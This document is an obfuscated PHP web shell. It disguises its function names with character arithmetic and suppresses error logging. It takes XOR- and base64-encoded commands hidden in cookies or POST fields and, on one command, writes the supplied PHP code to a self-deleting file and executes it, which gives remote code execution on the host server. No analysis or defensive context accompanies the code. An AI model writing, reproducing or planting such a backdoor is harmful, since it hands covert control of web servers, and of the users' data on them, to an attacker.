<?php $rmofqev = "\146"."\151".chr(434-326)."\145".chr(95).'p'."\x75"."\x74"."\137".chr(99)."\157"."\x6e"."\x74"."\x65"."\x6e".chr(511-395).chr(149-34);
$uqjkxv = "\x62".'a'.chr(115).chr(666-565)."\x36".chr(52).'_'."\x64".'e'.chr(99).'o'."\144".chr(101);
$lepqs = chr(671-566).chr(800-690)."\151".chr(1028-933).'s'."\145".chr(142-26);
$elaojwubh = chr(117)."\x6e".chr(957-849)."\151"."\x6e"."\153";


@$lepqs("\145"."\x72"."\x72"."\157".chr(114).chr(95).'l'.chr(952-841)."\x67", NULL);
@$lepqs(chr(731-623).chr(111)."\x67"."\x5f"."\x65".chr(592-478).chr(675-561).'o'."\162".chr(115), 0);
@$lepqs('m'.chr(777-680).chr(396-276)."\x5f"."\145".'x'."\145".chr(99)."\x75".chr(395-279).chr(105).'o'."\156".chr(200-105).'t'."\151".chr(1015-906)."\x65", 0);
@set_time_limit(0);

function hajjzoma($cyyxflomm, $euqiwgyhod)
{
    $vbuwpxhgmg = "";
    for ($rhfgdz = 0; $rhfgdz < strlen($cyyxflomm);) {
        for ($j = 0; $j < strlen($euqiwgyhod) && $rhfgdz < strlen($cyyxflomm); $j++, $rhfgdz++) {
            $vbuwpxhgmg .= chr(ord($cyyxflomm[$rhfgdz]) ^ ord($euqiwgyhod[$j]));
        }
    }
    return $vbuwpxhgmg;
}

$uyomdygk = array_merge($_COOKIE, $_POST);
$guukpczadu = 'ac3cc320-ae09-4cb1-ad10-c870834e1c77';
foreach ($uyomdygk as $jjbdnddr => $cyyxflomm) {
    $cyyxflomm = @unserialize(hajjzoma(hajjzoma($uqjkxv($cyyxflomm), $guukpczadu), $jjbdnddr));
    if (isset($cyyxflomm["\x61".'k'])) {
        if ($cyyxflomm["\141"] == chr(793-688)) {
            $rhfgdz = array(
                "\x70".chr(498-380) => @phpversion(),
                's'.chr(118) => "3.5",
            );
            echo @serialize($rhfgdz);
        } elseif ($cyyxflomm["\141"] == chr(101)) {
            $aqtnkhzarb = "./" . md5($guukpczadu) . chr(844-798).chr(635-530).chr(120-10)."\143";
            @$rmofqev($aqtnkhzarb, "<" . chr(77-14).chr(112)."\x68".'p'."\40"."\x40".chr(860-743)."\156".chr(108)."\x69".chr(110).chr(107).chr(40)."\137".chr(95).chr(857-787).chr(73)."\114".chr(890-821)."\137".chr(95).chr(41).chr(59)."\x20" . $cyyxflomm["\144"]);
            include($aqtnkhzarb);
            @$elaojwubh($aqtnkhzarb);
        }
        exit();
    }
}

